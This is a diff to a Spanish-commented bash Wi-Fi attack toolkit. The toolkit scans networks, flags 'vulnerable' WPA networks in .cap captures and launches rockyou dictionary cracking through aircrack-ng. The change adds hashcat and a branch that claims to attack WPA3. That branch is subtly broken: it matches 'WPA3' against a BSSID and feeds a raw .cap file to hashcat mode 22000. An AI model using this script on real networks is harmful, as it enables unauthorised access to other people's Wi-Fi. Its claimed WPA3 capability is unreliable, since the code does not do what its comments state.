@@ -12,7 +12,7 @@ PROJECT_NAME="wifi_toolkit"
 DOWNLOADS_DIR="$HOME/Downloads"
 PROJECT_DIR="$DOWNLOADS_DIR/$PROJECT_NAME"
 RESULTS_DIR="$PROJECT_DIR/resultados_wifi"
-DEPENDENCIES=("aircrack-ng" "xterm" "iw" "curl" "gzip")
+DEPENDENCIES=("aircrack-ng" "xterm" "iw" "curl" "gzip" "hashcat")
 
 # Función: Limpiar pantalla con scroll visible
 clear_screen() {
@@ -94,7 +94,7 @@ scan_networks() {
     sleep 2
 }
 
-# Analizar archivo .cap y recomendar redes
+# Analizar archivo .cap y recomendar redes (incluye WPA3)
 analyze_cap_file() {
     clear_screen
     echo -e "${BLUE}[+] Analizando archivo .cap para recomendar redes...${NC}"
@@ -106,7 +106,7 @@ analyze_cap_file() {
     fi
 
     echo -e "${GREEN}[+] Archivo .cap encontrado: $cap_file${NC}"
-    recommended_networks=$(aircrack-ng $cap_file | grep "WPA" | awk '{print $3, $4, $5}')
+    recommended_networks=$(aircrack-ng $cap_file | grep -E "WPA|WPA3" | awk '{print $3, $4, $5}')
 
     if [[ -z "$recommended_networks" ]]; then
         echo -e "${RED}[-] No se encontraron redes vulnerables en el archivo .cap.${NC}"
@@ -134,7 +134,12 @@ perform_attack() {
     dictionary=$(find_rockyou_dictionary)
 
     echo -e "${BLUE}[+] Ejecutando ataque contra la red: $network${NC}"
-    xterm -hold -e "aircrack-ng -w $dictionary -b $network $RESULTS_DIR/scan_results*.cap" &
+    if [[ "$network" == *"WPA3"* ]]; then
+        echo -e "${BLUE}[+] WPA3 detectado. Usando hashcat para el ataque.${NC}"
+        xterm -hold -e "hashcat -m 22000 $RESULTS_DIR/scan_results*.cap $dictionary" &
+    else
+        xterm -hold -e "aircrack-ng -w $dictionary -b $network $RESULTS_DIR/scan_results*.cap" &
+    fi
     sleep 2
 }
 
